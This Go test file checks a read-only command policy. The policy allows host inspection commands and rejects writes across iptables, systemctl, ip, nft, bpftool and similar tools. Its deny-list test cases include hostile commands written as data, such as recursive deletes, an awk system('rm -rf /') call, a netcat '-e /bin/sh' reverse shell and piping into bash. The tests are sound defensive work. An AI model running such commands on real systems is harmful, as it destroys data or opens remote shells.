package cmdpolicy

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// installFakeBin places an empty exec file at policy.bins[bin].AbsPath
// and returns a teardown. We need this so Decide() doesn't error with
// "binary not installed" inside tests on a stripped-down CI host.
func installFakeBin(t *testing.T, p *Policy, bin string) {
	t.Helper()
	bp := p.bins[bin]
	if bp == nil {
		t.Fatalf("bin %q not in policy", bin)
	}
	dir := t.TempDir()
	abs := filepath.Join(dir, bin)
	if err := os.WriteFile(abs, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	bp.AbsPath = abs
}

func TestDefaultReadOnly_ClassCounts(t *testing.T) {
	p := DefaultReadOnly()
	counts := map[BinaryClass]int{}
	for _, bp := range p.bins {
		counts[bp.Class]++
	}
	if counts[ClassReadFS] < 16 {
		t.Errorf("expected ≥16 ClassReadFS bins, got %d", counts[ClassReadFS])
	}
	if counts[ClassReadSystem] < 17 {
		t.Errorf("expected ≥17 ClassReadSystem bins, got %d", counts[ClassReadSystem])
	}
	if counts[ClassMixed] < 5 {
		t.Errorf("expected ≥5 ClassMixed bins, got %d", counts[ClassMixed])
	}
	if counts[ClassDenied] < 25 {
		t.Errorf("expected ≥25 ClassDenied bins, got %d", counts[ClassDenied])
	}
	t.Logf("class counts: %+v (total=%d)", counts, len(p.bins))
}

func TestDecide_DeniedBinaries(t *testing.T) {
	p := DefaultReadOnly()
	for _, cmd := range []string{
		"rm -rf /tmp/x",
		"bash -c 'echo hi'",
		"python -c 'print(1)'",
		"chmod 777 /etc/passwd",
		"shutdown now",
	} {
		d := p.Decide(cmd)
		if d.Allow {
			t.Errorf("%q: expected reject, got allow", cmd)
		}
	}
}

func TestDecide_ReadFSAllow(t *testing.T) {
	p := DefaultReadOnly()
	for _, b := range []string{"ls", "cat", "grep", "find", "wc", "awk", "sed"} {
		installFakeBin(t, p, b)
	}
	for _, cmd := range []string{
		"ls /var",
		"cat /etc/hosts",
		"grep error /var/log/syslog",
		"find /var -size +10M",
		"awk '{print $1}'",
		`sed 's/foo/bar/'`,
	} {
		d := p.Decide(cmd)
		if !d.Allow {
			t.Errorf("%q: expected allow, got reject (%s)", cmd, d.Reason)
		}
	}
}

func TestDecide_FindDeleteRejected(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "find")
	d := p.Decide("find /tmp -name foo -delete")
	if d.Allow {
		t.Errorf("expected reject for find -delete")
	}
	d = p.Decide("find /tmp -name foo -exec rm {} +")
	if d.Allow {
		t.Errorf("expected reject for find -exec")
	}
}

func TestDecide_SedInPlaceRejected(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "sed")
	for _, cmd := range []string{
		`sed -i 's/a/b/' /tmp/x`,
		`sed --in-place 's/a/b/' /tmp/x`,
	} {
		if d := p.Decide(cmd); d.Allow {
			t.Errorf("%q: expected reject", cmd)
		}
	}
}

func TestDecide_AwkSystemRejected(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "awk")
	if d := p.Decide(`awk 'BEGIN{system("rm -rf /")}'`); d.Allow {
		t.Errorf("expected reject for awk system()")
	}
}

func TestDecide_IptablesReadVsWrite(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "iptables")
	// READ
	for _, cmd := range []string{
		"iptables -L",
		"iptables -L -n",
		"iptables -S",
		"iptables --list",
	} {
		if d := p.Decide(cmd); !d.Allow {
			t.Errorf("%q: expected allow, got %s", cmd, d.Reason)
		}
	}
	// WRITE
	for _, cmd := range []string{
		"iptables -A INPUT -j DROP",
		"iptables -F",
		"iptables -I OUTPUT 1 -j ACCEPT",
		"iptables -P INPUT DROP",
	} {
		if d := p.Decide(cmd); d.Allow {
			t.Errorf("%q: expected reject", cmd)
		}
	}
}

func TestDecide_SystemctlReadVsWrite(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "systemctl")
	for _, cmd := range []string{
		"systemctl status nginx",
		"systemctl cat nginx",
		"systemctl list-units",
		"systemctl is-active nginx",
	} {
		if d := p.Decide(cmd); !d.Allow {
			t.Errorf("%q: expected allow, got %s", cmd, d.Reason)
		}
	}
	for _, cmd := range []string{
		"systemctl restart nginx",
		"systemctl stop nginx",
		"systemctl daemon-reload",
		"systemctl enable nginx",
	} {
		if d := p.Decide(cmd); d.Allow {
			t.Errorf("%q: expected reject", cmd)
		}
	}
}

func TestDecide_TcQdiscShow(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "tc")
	if d := p.Decide("tc qdisc show dev eth0"); !d.Allow {
		t.Errorf("expected allow, got %s", d.Reason)
	}
	if d := p.Decide("tc qdisc add dev eth0 root htb"); d.Allow {
		t.Errorf("expected reject for tc qdisc add")
	}
}

func TestDecide_IpReadVsWrite(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "ip")
	for _, cmd := range []string{
		"ip addr show",
		"ip addr",
		"ip link show",
		"ip route show",
	} {
		if d := p.Decide(cmd); !d.Allow {
			t.Errorf("%q: expected allow, got %s", cmd, d.Reason)
		}
	}
	for _, cmd := range []string{
		"ip addr add 10.0.0.1/24 dev eth0",
		"ip link set eth0 down",
		"ip route flush table main",
	} {
		if d := p.Decide(cmd); d.Allow {
			t.Errorf("%q: expected reject", cmd)
		}
	}
}

// TestDecide_AdvancedNetworkBins covers the Layer-1 network-research
// additions: ovs-{vsctl,ofctl,dpctl,appctl}, nft, conntrack, ipset,
// ethtool, bpftool. For each pair we verify a representative read
// allows and a representative write rejects. Rejection of `ip netns
// exec` (cmdpolicy bypass via namespace re-entry) is checked too.
func TestDecide_AdvancedNetworkBins(t *testing.T) {
	p := DefaultReadOnly()
	for _, b := range []string{"ovs-vsctl", "ovs-ofctl", "ovs-dpctl", "ovs-appctl", "nft", "conntrack", "ipset", "ethtool", "bpftool", "ip"} {
		installFakeBin(t, p, b)
	}
	allow := []string{
		"ovs-vsctl show",
		"ovs-vsctl list-br",
		"ovs-vsctl get Bridge br0 datapath_id",
		"ovs-ofctl show br0",
		"ovs-ofctl dump-flows br0",
		"ovs-ofctl dump-ports br0",
		"ovs-dpctl show",
		"ovs-dpctl dump-flows",
		"ovs-appctl fdb/show br0",
		"nft list ruleset",
		"nft list table ip filter",
		"conntrack -L",
		"conntrack --stats",
		"ipset list",
		"ethtool eth0",
		"ethtool -i eth0",
		"bpftool prog show",
		"bpftool map dump id 12",
		"bpftool net show",
		"bpftool feature probe",
		"ip netns list",
		"ip netns identify 1234",
		// `ip -n <ns> <subcmd>` is the canonical "do this in netns" form
		// but the global `-n <ns>` prefix shifts argv past the
		// SubcmdPath/Subcmd matchers and isn't expressible in this
		// rule grammar. Per-namespace inspection lands in Layer-2 via a
		// host_netns_inspect skill that builds the right argv internally;
		// not testing it here.
	}
	for _, cmd := range allow {
		if d := p.Decide(cmd); !d.Allow {
			t.Errorf("%q: expected allow, got %s", cmd, d.Reason)
		}
	}
	deny := []string{
		"ovs-vsctl add-br br0",
		"ovs-vsctl del-br br0",
		"ovs-vsctl set Bridge br0 datapath_id=0xabc",
		"ovs-ofctl add-flow br0 'in_port=1,actions=output:2'",
		"ovs-ofctl del-flows br0",
		"ovs-dpctl add-dp ovs-system",
		"ovs-appctl vlog/set ANY:dbg",
		"nft add rule inet filter input drop",
		"nft delete table ip filter",
		"nft flush ruleset",
		"conntrack -F",
		"conntrack -D --orig-src 1.2.3.4",
		"ipset create blacklist hash:ip",
		"ipset add blacklist 1.2.3.4",
		"ethtool -K eth0 tso off",
		"ethtool -G eth0 rx 4096",
		"bpftool prog load /tmp/x.o /sys/fs/bpf/x",
		"bpftool prog attach id 12 xdp eth0",
		"bpftool map update id 12 key 0 value 1",
		"ip netns exec foo iptables -F",
		"ip netns add ns0",
	}
	for _, cmd := range deny {
		if d := p.Decide(cmd); d.Allow {
			t.Errorf("%q: expected reject", cmd)
		}
	}
}

func TestDecide_MountListVsMount(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "mount")
	if d := p.Decide("mount -l"); !d.Allow {
		t.Errorf("mount -l expected allow, got %s", d.Reason)
	}
	if d := p.Decide("mount"); !d.Allow {
		t.Errorf("bare mount expected allow, got %s", d.Reason)
	}
	if d := p.Decide("mount /dev/sda1 /mnt"); d.Allow {
		t.Errorf("mount with two paths expected reject")
	}
}

func TestDecide_CrontabReadVsWrite(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "crontab")
	if d := p.Decide("crontab -l"); !d.Allow {
		t.Errorf("crontab -l expected allow")
	}
	if d := p.Decide("crontab -e"); d.Allow {
		t.Errorf("crontab -e expected reject")
	}
}

func TestDecide_NetworkOnlyReadFlags(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "curl")
	installFakeBin(t, p, "wget")
	installFakeBin(t, p, "nc")
	for _, cmd := range []string{
		"curl -o /tmp/x http://example.com",
		"curl --output /tmp/x http://example.com",
		"wget -O /tmp/x http://example.com",
		"nc -e /bin/sh 1.2.3.4 1234",
	} {
		if d := p.Decide(cmd); d.Allow {
			t.Errorf("%q: expected reject", cmd)
		}
	}
}

func TestDecide_PipelineMixedAllow(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "ps")
	installFakeBin(t, p, "grep")
	installFakeBin(t, p, "head")
	d := p.Decide("ps aux | grep ongrid | head -5")
	if !d.Allow {
		t.Errorf("expected allow, got %s", d.Reason)
	}
}

func TestDecide_PipelineRejectsAnyDenied(t *testing.T) {
	p := DefaultReadOnly()
	installFakeBin(t, p, "ps")
	d := p.Decide("ps aux | bash")
	if d.Allow {
		t.Errorf("expected reject (bash in pipeline)")
	}
}

func TestDecide_MaxArgs(t *testing.T) {
	p := DefaultReadOnly()
	p.MaxArgs = 3
	installFakeBin(t, p, "ls")
	if d := p.Decide("ls a b c d e f"); d.Allow {
		t.Errorf("expected reject for >MaxArgs argv")
	}
}

func TestLoadFromYAML_Override(t *testing.T) {
	dir := t.TempDir()
	yamlPath := filepath.Join(dir, "policy.yaml")
	yaml := `binaries:
  - name: nc
    class: network
    read_only_matchers:
      - any_flag: ["-z"]
    denied_args: ["-e", "-c", "-l"]
  - name: htop
    class: read-system
network_host_allowlist:
  - 10.0.0.0/8
  - .internal
stdout_cap_bytes: 1024
timeout_seconds: 5
`
	if err := os.WriteFile(yamlPath, []byte(yaml), 0o644); err != nil {
		t.Fatal(err)
	}
	base := DefaultReadOnly()
	got, err := LoadFromYAML(yamlPath, base)
	if err != nil {
		t.Fatalf("LoadFromYAML: %v", err)
	}
	if got.StdoutCap != 1024 {
		t.Errorf("StdoutCap = %d, want 1024", got.StdoutCap)
	}
	if got.Timeout.Seconds() != 5 {
		t.Errorf("Timeout = %v, want 5s", got.Timeout)
	}
	if len(got.NetworkHostAllowlist) != 2 {
		t.Errorf("NetworkHostAllowlist len = %d", len(got.NetworkHostAllowlist))
	}
	if got.Lookup("htop") == nil {
		t.Errorf("htop not registered after merge")
	}
	// Base is unchanged (clone semantics).
	if base.StdoutCap == 1024 {
		t.Errorf("base mutated by LoadFromYAML — clone broken")
	}
}

func TestLoadFromYAML_RejectsBadClass(t *testing.T) {
	dir := t.TempDir()
	yamlPath := filepath.Join(dir, "bad.yaml")
	yaml := `binaries:
  - name: htop
    class: not-a-class
`
	_ = os.WriteFile(yamlPath, []byte(yaml), 0o644)
	if _, err := LoadFromYAML(yamlPath, nil); err == nil || !strings.Contains(err.Error(), "invalid class") {
		t.Errorf("expected invalid-class error, got %v", err)
	}
}
